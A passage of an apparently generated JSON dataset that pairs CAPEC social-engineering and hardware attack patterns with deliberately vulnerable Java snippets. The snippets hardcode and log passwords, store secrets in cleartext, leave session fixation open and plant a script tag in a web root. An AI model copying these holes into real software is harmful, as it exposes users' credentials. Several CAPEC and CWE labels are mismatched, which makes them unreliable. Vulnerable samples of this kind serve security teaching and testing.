        "description": "This Java code snippet simulates the cloning of RFID tags, embodying the main idea of the CAPEC 'Cloning RFID Cards or Chips'. The code includes a simple RFID database and functions to add, clone, and authenticate RFID tags. The 'cloneRFIDTag' method demonstrates the vulnerability by simply copying the tag ID, which represents the cloning process. The 'authenticateRFIDTag' method shows an insecure security identifier mechanism by checking if the tag ID exists in the database without any additional security checks. This snippet highlights the ease of cloning RFID tags and the potential security weaknesses in their implementation."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class RFIDChip {\n    private boolean isActive = true;\n    private Map<String, String> internalRegisters = new HashMap<>();\n    private boolean redundancyEnabled = true;\n    private boolean alertEnabled = true;\n\n    public RFIDChip() {\n        // Initialize internal registers with some dummy data\n        internalRegisters.put(\"reg1\", \"value1\");\n        internalRegisters.put(\"reg2\", \"value2\");\n    }\n\n    // Simulate improper access control to internal registers\n    public void accessInternalRegister(String register, String value) {\n        if (internalRegisters.containsKey(register)) {\n            internalRegisters.put(register, value);\n        }\n    }\n\n    // Simulate error injection to degrade redundancy\n    public void injectError() {\n        redundancyEnabled = false;\n    }\n\n    // Simulate disabling alert signals\n    public void disableAlert() {\n        alertEnabled = false;\n    }\n\n    // Simulate deactivation of the RFID chip\n    public void deactivateChip() {\n        isActive = false;\n    }\n\n    public boolean isChipActive() {\n        return isActive;\n    }\n\n    public static void main(String[] args) {\n        RFIDChip chip = new RFIDChip();\n        // Attacker deactivates the chip\n        chip.deactivateChip();\n        System.out.println(\"RFID Chip Active: \" + chip.isChipActive());\n    }\n}",
        "description": "This Java code snippet represents the concept of 'RFID Chip Deactivation or Destruction' (CAPEC) by simulating various vulnerabilities (CWEs) that could be exploited to deactivate an RFID chip. The code includes methods to improperly access internal registers (CWE-1191), inject errors to degrade redundancy (CWE-1334), and disable alert signals (CWE-1320). The main method demonstrates an attacker deactivating the RFID chip, rendering it unresponsive. This snippet highlights the potential security weaknesses in RFID systems and how they can be exploited to disable the chip without damaging the object housing it."
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class HardwareAccess {\n    private boolean isAuthenticated = false;\n\n    public void authenticate(String password) {\n        // Improper Physical Access Control (CWE-1263)\n        if (password.equals(\"admin\")) {\n            isAuthenticated = true;\n        }\n    }\n\n    public void writeToHardware(String data) throws IOException {\n        if (isAuthenticated) {\n            // Improper Restriction of Software Interfaces to Hardware Features (CWE-1256)\n            File hardwareFile = new File(\"/dev/hardware\");\n            FileWriter writer = new FileWriter(hardwareFile);\n            writer.write(data);\n            writer.close();\n        }\n    }\n\n    public static void main(String[] args) throws IOException {\n        HardwareAccess ha = new HardwareAccess();\n        ha.authenticate(\"admin\");\n        ha.writeToHardware(\"malicious data\");\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can exploit improper physical access control (CWE-1263) and improper restriction of software interfaces to hardware features (CWE-1256). The `authenticate` method uses a hardcoded password to grant access, representing weak access control. Once authenticated, the `writeToHardware` method allows writing data directly to a hardware file, simulating the ability to modify hardware components. This embodies the main idea of the CAPEC, where an adversary gains physical access and manipulates hardware to undermine system integrity."
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "import java.util.Scanner;\n\npublic class ATAPasswordBypass {\n    private static final String HARD_CODED_PASSWORD = \"defaultPassword\";\n    private static boolean isAuthenticated = false;\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter ATA password: \");\n        String inputPassword = scanner.nextLine();\n\n        if (authenticate(inputPassword)) {\n            System.out.println(\"Access granted.\");\n            isAuthenticated = true;\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n\n        // Simulate hot swapping by bypassing authentication\n        if (!isAuthenticated) {\n            System.out.println(\"Bypassing authentication via hot swap...\");\n            resetPassword();\n            System.out.println(\"Password reset. Access granted.\");\n        }\n    }\n\n    private static boolean authenticate(String password) {\n        return HARD_CODED_PASSWORD.equals(password);\n    }\n\n    private static void resetPassword() {\n        // In a real scenario, this would involve hardware manipulation\n        isAuthenticated = true;\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Bypassing ATA Password Security' vulnerability. The code includes a hard-coded password (CWE-798, CWE-259) and simulates an ATA password authentication mechanism. If the user fails to authenticate, the code simulates a 'hot swap' scenario where the password is reset without proper authorization (CWE-285, CWE-1220). This bypasses the security mechanism, granting access to the drive. The code highlights the vulnerability of insufficient granularity in access control and improper authorization checks."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class VulnerableCode {\n    private static final Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword123\";\n        storeSensitiveData(sensitiveData);\n    }\n\n    public static void storeSensitiveData(String data) {\n        try {\n            File file = new File(\"sensitiveData.txt\");\n            FileWriter writer = new FileWriter(file);\n            writer.write(data);\n            writer.close();\n            logger.info(\"Sensitive data stored successfully.\");\n        } catch (IOException e) {\n            logger.severe(\"Failed to store sensitive data.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable approach to storing sensitive data, embodying the deprecated CAPEC-118 and related CWEs. The code writes sensitive information (a password) directly to a file without any encryption or protection, which is a common issue highlighted in CWE-217 (Failure to Protect Stored Data from Modification) and CWE-218 (Failure to provide confidentiality for stored data). Additionally, the use of logging to indicate the storage of sensitive data can lead to information exposure, as noted in CWE-533 (Information Exposure Through Server Log Files). This example illustrates the importance of securing sensitive data both in storage and in logs."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class VulnerableCode {\n    private static final Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword123\";\n        logSensitiveData(sensitiveData);\n        storeSensitiveData(sensitiveData);\n    }\n\n    private static void logSensitiveData(String data) {\n        // CWE-532: Information Exposure Through Log Files\n        logger.info(\"Sensitive Data: \" + data);\n    }\n\n    private static void storeSensitiveData(String data) {\n        // CWE-767: Improper Protection of Stored Data\n        File file = new File(\"sensitiveData.txt\");\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(data);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation that embodies the deprecated CAPEC concept of 'Social Information Gathering via Research' and related CWEs. The code logs sensitive data (CWE-532) and stores it in a file without proper protection (CWE-767). The `logSensitiveData` method logs sensitive information, which can be exposed through server log files. The `storeSensitiveData` method writes sensitive data to a file without encryption or access control, making it susceptible to unauthorized access and modification. This example highlights the importance of protecting sensitive information both in transit and at rest."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class SensitiveDataHandler {\n    public static void main(String[] args) {\n        // Simulate storing sensitive information in cleartext\n        String sensitiveData = \"User: admin, Password: admin123\";\n        File file = new File(\"/tmp/sensitive_data.txt\");\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // Simulate generating a core dump file\n        generateCoreDump();\n    }\n\n    private static void generateCoreDump() {\n        // Simulate a core dump file being created in an accessible directory\n        File coreDump = new File(\"/tmp/core_dump.txt\");\n        try (FileWriter writer = new FileWriter(coreDump)) {\n            writer.write(\"Core dump data...\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the CAPEC 'Dumpster Diving' and associated CWEs. The code stores sensitive information (username and password) in cleartext in a file located in a temporary directory, which can be easily accessed by unauthorized actors (CWE-316). Additionally, it simulates the generation of a core dump file in the same directory, which could expose sensitive information to unauthorized users (CWE-528). This scenario represents the main idea of dumpster diving, where an adversary searches through discarded files to find valuable information."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class PretextingExample {\n    private static Map<String, String> userSessions = new HashMap<>();\n    private static Map<String, String> userData = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate user data\n        userData.put(\"user1\", \"password123\");\n        userData.put(\"user2\", \"password456\");\n\n        // Simulate an attacker pretexting as 'user1'\n        String attackerSessionId = \"attackerSession\";\n        userSessions.put(\"user1\", attackerSessionId);\n\n        // Attacker uses the session fixation vulnerability\n        if (authenticate(\"user1\", \"password123\", attackerSessionId)) {\n            System.out.println(\"Attacker authenticated as user1\");\n            // Access sensitive information\n            String sensitiveInfo = getSensitiveInformation(\"user1\");\n            System.out.println(\"Sensitive Information: \" + sensitiveInfo);\n        }\n    }\n\n    private static boolean authenticate(String username, String password, String sessionId) {\n        // CWE-384: Session Fixation\n        if (userData.containsKey(username) && userData.get(username).equals(password)) {\n            userSessions.put(username, sessionId); // Does not invalidate existing session\n            return true;\n        }\n        return false;\n    }\n\n    private static String getSensitiveInformation(String username) {\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        if (userSessions.containsKey(username)) {\n            return \"Sensitive data for \" + username;\n        }\n        return \"No data available\";\n    }\n}",
        "description": "This Java code snippet demonstrates a pretexting attack where an adversary assumes the identity of a legitimate user ('user1') to gain unauthorized access to sensitive information. The code includes a session fixation vulnerability (CWE-384) where the session ID is not invalidated upon authentication, allowing the attacker to hijack the session. Additionally, it exposes sensitive information (CWE-200) to the attacker once authenticated. The main idea of the CAPEC is represented by the attacker creating a pretext (assuming the identity of 'user1') to manipulate the system into providing access to sensitive information."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableLogging {\n    private static final Logger logger = Logger.getLogger(VulnerableLogging.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // Setup logger to write to a file\n            FileHandler fh = new FileHandler(\"server.log\", true);\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            // Log sensitive information\n            String sensitiveData = \"User password: mySecretPassword123\";\n            logger.info(sensitiveData);\n\n            // Write sensitive data to a file\n            FileWriter writer = new FileWriter(\"data.txt\");\n            writer.write(sensitiveData);\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to information exposure through logging and file storage. The code sets up a logger that writes to a file named 'server.log' and logs sensitive information, such as a user's password. Additionally, it writes the same sensitive information to a file named 'data.txt'. This embodies the deprecated CAPEC pattern of information gathering from traditional sources, as it shows how sensitive information can be exposed through improper logging and file storage practices. The related CWEs (CWE-532 and CWE-493) highlight the risks of exposing sensitive information through log files and failing to provide confidentiality for stored data."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableLogging {\n    private static final Logger logger = Logger.getLogger(VulnerableLogging.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // Setup logger to write to a file\n            FileHandler fh = new FileHandler(\"server.log\", true);\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            // Log sensitive information\n            String sensitiveData = \"User password: mySecretPassword123\";\n            logger.info(sensitiveData);\n\n            // Write sensitive data to a file without encryption\n            FileWriter writer = new FileWriter(\"data.txt\");\n            writer.write(sensitiveData);\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable logging mechanism that exposes sensitive information through server log files and stored data. The code sets up a logger to write logs to a file and logs sensitive information, such as a user's password, in plain text. Additionally, it writes the same sensitive information to a file without any encryption. This example embodies the deprecated CAPEC pattern of 'Information Gathering from Non-Traditional Sources' by showing how sensitive information can be exposed through improper logging and storage practices. The related CWEs (CWE-532 and CWE-493) highlight the risks of information exposure through log files and the failure to provide confidentiality for stored data."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "import java.util.Scanner;\n\npublic class InformationElicitation {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        if (verifyUser(username, password)) {\n            // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            System.out.println(\"Welcome, \" + username + \"! Your account balance is $10,000.\");\n        } else {\n            System.out.println(\"Invalid credentials.\");\n        }\n    }\n\n    private static boolean verifyUser(String username, String password) {\n        // CWE-205: Observable Behavioral Discrepancy\n        if (username.equals(\"admin\") && password.equals(\"admin123\")) {\n            return true;\n        } else if (username.equals(\"admin\")) {\n            // CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n            System.out.println(\"Incorrect password for admin.\");\n            return false;\n        } else {\n            return false;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple login system that embodies the main idea of CAPEC-118: Information Elicitation. The code includes vulnerabilities related to the CWEs mentioned. The `verifyUser` method improperly verifies the source of a communication channel (CWE-940) by not securely handling user credentials. It also exposes sensitive information (CWE-200) by displaying the account balance upon successful login. Additionally, the code reveals observable behavioral discrepancies (CWE-205 and CWE-207) by providing different error messages for incorrect passwords, which can help an attacker deduce valid usernames. This snippet highlights how an adversary could exploit these weaknesses to elicit sensitive information."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableLogging {\n    private static final Logger logger = Logger.getLogger(VulnerableLogging.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // Setup logger to write to a file\n            FileHandler fh = new FileHandler(\"server.log\", true);\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            // Simulate logging sensitive information\n            String sensitiveData = \"User: admin, Password: admin123\";\n            logger.info(\"Sensitive data: \" + sensitiveData);\n\n            // Simulate writing sensitive data to a debug log file\n            FileWriter debugLog = new FileWriter(\"debug.log\", true);\n            debugLog.write(\"Debug info: \" + sensitiveData + \"\\n\");\n            debugLog.close();\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable logging mechanism that exposes sensitive information through server and debug log files. The code sets up a logger to write logs to a file named 'server.log' and also writes sensitive information directly to a 'debug.log' file. This represents the deprecated CAPEC-407 attack pattern of social information gathering via pretexting, where an attacker could gather sensitive information from improperly protected log files. The related CWEs (CWE-532) highlight the risk of information exposure through log files, emphasizing the need to avoid logging sensitive data."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "import java.util.Scanner;\n\npublic class CustomerServicePretexting {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome to XYZ Bank Customer Service. Please verify your account number:\");\n        String accountNumber = scanner.nextLine();\n        System.out.println(\"Thank you. Please provide your credit card number for verification:\");\n        String creditCardNumber = scanner.nextLine();\n        // Simulate processing\n        System.out.println(\"Your account has been verified. Thank you!\");\n        // Sensitive information is exposed without proper verification\n        System.out.println(\"Account Number: \" + accountNumber);\n        System.out.println(\"Credit Card Number: \" + creditCardNumber);\n    }\n}",
        "description": "This Java code snippet simulates a customer service interaction where a user is asked to provide sensitive information such as an account number and a credit card number. The code does not perform any verification to ensure that the request is coming from a legitimate source, embodying CWE-940 (Improper Verification of Source of a Communication Channel) and CWE-300 (Channel Accessible by Non-Endpoint). Additionally, it exposes sensitive information (CWE-200) without proper authorization checks. This represents the main idea of the CAPEC 'Pretexting via Customer Service', where an adversary could solicit sensitive information by pretending to be a legitimate customer service representative."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class TechSupportPretexting {\n    public static void main(String[] args) {\n        String sensitiveInfo = \"User: admin\\nPassword: admin123\";\n        String filePath = \"C:\\\\Users\\\\Public\\\\sensitive_info.txt\";\n\n        // CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n        try (FileWriter writer = new FileWriter(filePath)) {\n            writer.write(sensitiveInfo);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-434: Unrestricted Upload of File with Dangerous Type\n        String dangerousFilePath = \"C:\\\\Users\\\\Public\\\\malicious.exe\";\n        try {\n            Files.copy(Paths.get(\"malicious.exe\"), Paths.get(dangerousFilePath));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-1263: Improper Physical Access Control\n        File sensitiveFile = new File(filePath);\n        if (sensitiveFile.exists()) {\n            System.out.println(\"Sensitive file is accessible: \" + sensitiveFile.getAbsolutePath());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary, posing as a tech support worker, exploits several vulnerabilities to compromise a system. The code performs the following actions:\n\n1. **CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory**: The code writes sensitive information (username and password) into a publicly accessible file (`sensitive_info.txt`).\n\n2. **CWE-434: Unrestricted Upload of File with Dangerous Type**: The code copies a potentially malicious executable file (`malicious.exe`) to a publicly accessible directory.\n\n3. **CWE-1263: Improper Physical Access Control**: The code checks if the sensitive file is accessible, simulating a scenario where an unauthorized actor with physical access can easily find and exploit sensitive information.\n\nThis snippet embodies the main idea of the CAPEC by illustrating how an adversary can use social engineering to gain access to sensitive information and upload malicious files, thereby compromising the system."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class DeliveryPersonPretexting {\n    public static void main(String[] args) {\n        try {\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            URL url = new URL(\"http://example.com/delivery\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n\n            // CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n            File sensitiveFile = new File(\"/var/www/html/sensitive_info.txt\");\n            try (BufferedWriter writer = new BufferedWriter(new FileWriter(sensitiveFile))) {\n                writer.write(\"Sensitive Information: User credentials\");\n            }\n\n            // CWE-300: Channel Accessible by Non-Endpoint\n            if (conn.getResponseCode() == 200) {\n                System.out.println(\"Delivery request sent successfully.\");\n            }\n\n            // CWE-433: Unparsed Raw Web Content Delivery\n            File rawContent = new File(\"/var/www/html/raw_content.txt\");\n            try (BufferedWriter writer = new BufferedWriter(new FileWriter(rawContent))) {\n                writer.write(\"<script>alert('This is raw content');</script>\");\n            }\n\n            // CWE-1292: Incorrect Conversion of Security Identifiers\n            String securityIdentifier = convertSecurityIdentifier(\"untrusted_input\");\n            System.out.println(\"Security Identifier: \" + securityIdentifier);\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static String convertSecurityIdentifier(String input) {\n        // Incorrect conversion logic\n        return \"SECURE_\" + input;\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary, posing as a delivery person, exploits various vulnerabilities to solicit information or manipulate the target. The code includes:\n\n1. **CWE-941**: Incorrectly specified destination in a communication channel, where a POST request is sent to a potentially incorrect URL.\n2. **CWE-538**: Sensitive information is written to a publicly accessible directory.\n3. **CWE-300**: The communication channel's integrity is not verified, allowing potential unauthorized access.\n4. **CWE-433**: Raw web content is stored under the web document root, which could be executed by the server.\n5. **CWE-1292**: Incorrect conversion of security identifiers, potentially allowing unauthorized access.\n\nThe code represents the main idea of the CAPEC by simulating how an adversary might exploit these weaknesses to gain unauthorized access or manipulate the target."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "import java.util.Scanner;\n\npublic class PretextingExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your employee ID:\");\n        String employeeId = scanner.nextLine();\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        if (authenticate(employeeId, password)) {\n            System.out.println(\"Authentication successful. Please provide the sensitive information:\");\n            String sensitiveInfo = scanner.nextLine();\n            System.out.println(\"Sensitive information received: \" + sensitiveInfo);\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    private static boolean authenticate(String employeeId, String password) {\n        // Simulate authentication process\n        return \"employee123\".equals(employeeId) && \"password123\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple scenario where an adversary could engage in pretexting via phone. The code simulates a situation where an employee is asked to provide their employee ID and password for authentication. If the authentication is successful, the employee is then prompted to provide sensitive information. This example embodies the main idea of CAPEC-Pretexting via Phone by showing how an adversary could impersonate a trusted entity to solicit sensitive information. The code also highlights related CWEs such as improper verification of the source of a communication channel (CWE-940) and exposure of sensitive information to an unauthorized actor (CWE-200)."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "import java.util.Scanner;\n\npublic class SocialEngineeringExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome to the secure system. Please enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Hello \" + username + \", could you please provide your password for verification?\");\n        String password = scanner.nextLine();\n        \n        // Simulate a delay to make the user feel comfortable\n        try {\n            Thread.sleep(2000);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        \n        // Improperly handle the password (CWE-200, CWE-202)\n        System.out.println(\"Thank you, \" + username + \". Your password is \" + password + \".\");\n        \n        // Simulate a resource creation (CWE-1229)\n        String sessionToken = \"SESSION12345\";\n        System.out.println(\"Your session token is: \" + sessionToken);\n        \n        // Improper control of interaction frequency (CWE-799)\n        for (int i = 0; i < 5; i++) {\n            System.out.println(\"Interaction \" + (i + 1) + \": Please confirm your password again.\");\n            String confirmPassword = scanner.nextLine();\n            if (!confirmPassword.equals(password)) {\n                System.out.println(\"Password mismatch. Please try again.\");\n            } else {\n                System.out.println(\"Password confirmed.\");\n            }\n        }\n        \n        scanner.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a simple social engineering attack where an adversary manipulates a user into providing sensitive information, such as a password. The code simulates a secure system login process, asking the user for their username and password. It then improperly handles the password by printing it out (CWE-200, CWE-202), which exposes sensitive information. Additionally, it creates a session token (CWE-1229) and improperly controls the interaction frequency by repeatedly asking the user to confirm their password (CWE-799). This example embodies the main idea of CAPEC 'Manipulate Human Behavior' by exploiting the user's trust and comfort to extract sensitive information."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "import java.util.Scanner;\n\npublic class SocialEngineeringExample {\n    private static final String SECRET_PASSWORD = \"s3cr3t\";\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter your password: \");\n        String password = scanner.nextLine();\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        return password.equals(SECRET_PASSWORD);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple authentication mechanism that is vulnerable to social engineering attacks, embodying the main idea of CAPEC-Influence Perception. The code asks the user for a username and password, and then checks if the provided password matches a hardcoded secret password. This represents CWE-654 (Reliance on a Single Factor in a Security Decision), as the authentication relies solely on the password. An adversary could use social engineering to trick a user into revealing the password, thereby gaining unauthorized access. The code is also an example of CWE-656 (Reliance on Security Through Obscurity), as the security depends on the secrecy of the hardcoded password."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            System.out.println(\"Server is listening on port 8080\");\n\n            while (true) {\n                Socket socket = serverSocket.accept();\n                new ClientHandler(socket).start();\n            }\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n    }\n}\n\nclass ClientHandler extends Thread {\n    private Socket socket;\n\n    public ClientHandler(Socket socket) {\n        this.socket = socket;\n    }\n\n    public void run() {\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n             PrintWriter out = new PrintWriter(socket.getOutputStream(), true)) {\n\n            String clientMessage = in.readLine();\n            System.out.println(\"Received: \" + clientMessage);\n\n            // CWE-940: Improper Verification of Source of a Communication Channel\n            if (clientMessage.startsWith(\"Hello\")) {\n                out.println(\"Hi there! What's your name?\");\n                String name = in.readLine();\n                System.out.println(\"Received name: \" + name);\n\n                // CWE-300: Channel Accessible by Non-Endpoint\n                // CWE-301: Reflection Attack in an Authentication Protocol\n                out.println(\"Nice to meet you, \" + name + \". Can you tell me your password?\");\n                String password = in.readLine();\n                System.out.println(\"Received password: \" + password);\n\n                // CWE-222: Truncation of Security-relevant Information\n                if (password.length() > 5) {\n                    out.println(\"Password accepted\");\n                } else {\n                    out.println(\"Password too short\");\n                }\n            }\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that listens for incoming connections on port 8080. When a client connects, the server engages in a simple conversation, asking for the client's name and password. The code demonstrates several vulnerabilities: \n\n1. **CWE-940: Improper Verification of Source of a Communication Channel** - The server does not verify the source of the incoming message, making it susceptible to spoofing.\n2. **CWE-300: Channel Accessible by Non-Endpoint** and **CWE-301: Reflection Attack in an Authentication Protocol** - The server asks for sensitive information (password) without ensuring the integrity and authenticity of the communication channel.\n3. **CWE-222: Truncation of Security-relevant Information** - The server performs a simplistic check on the password length, potentially truncating important security information.\n\nThe main idea of the CAPEC is embodied in the social engineering aspect, where the server uses a friendly conversation to elicit sensitive information (password) from the client, exploiting the sense of obligation to reciprocate."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            String targetUrl = \"http://example.com/api\";\n            URL url = new URL(targetUrl);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode == 200) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                String inputLine;\n                StringBuffer response = new StringBuffer();\n\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n\n                System.out.println(\"Response: \" + response.toString());\n            } else if (responseCode == 404) {\n                System.out.println(\"Resource not found\");\n            } else {\n                System.out.println(\"Unexpected response code: \" + responseCode);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication pattern where the target URL is hardcoded and the response handling reveals observable discrepancies (CWE-203, CWE-205). The code sends an HTTP GET request to a specified URL and prints different messages based on the HTTP response code. An attacker could infer the existence of certain resources or the internal state of the application based on these observable discrepancies. Additionally, the code does not handle potential issues like incorrect destination specification (CWE-941) or secure algorithm negotiation (CWE-757), making it susceptible to various attacks. This embodies the deprecated CAPEC pattern of influencing the target via perception of concession by revealing security-relevant information through observable behavior."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "import java.util.Scanner;\n\npublic class ScarcityInfluence {\n    private static final String SECRET_CODE = \"12345\"; // CWE-656: Reliance on Security Through Obscurity\n    private static boolean isScarcity = true; // Simulating scarcity condition\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Limited time offer! Enter the secret code to get access:\");\n        String userInput = scanner.nextLine();\n\n        if (isScarcity && userInput.equals(SECRET_CODE)) { // CWE-654: Reliance on a Single Factor in a Security Decision\n            System.out.println(\"Access granted! You have unlocked the special offer.\");\n        } else {\n            System.out.println(\"Access denied. Try again later.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Influence Perception of Scarcity' by simulating a scenario where a user is prompted to enter a secret code to gain access to a limited-time offer. The code leverages the perception of scarcity (isScarcity) to create urgency. It relies on a single factor (the secret code) for access control, which is a security weakness (CWE-654). Additionally, the secret code is hardcoded and relies on security through obscurity (CWE-656), making it vulnerable if the code is discovered. The code snippet is concise and represents the main idea of the CAPEC by using related CWEs to highlight potential security weaknesses."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
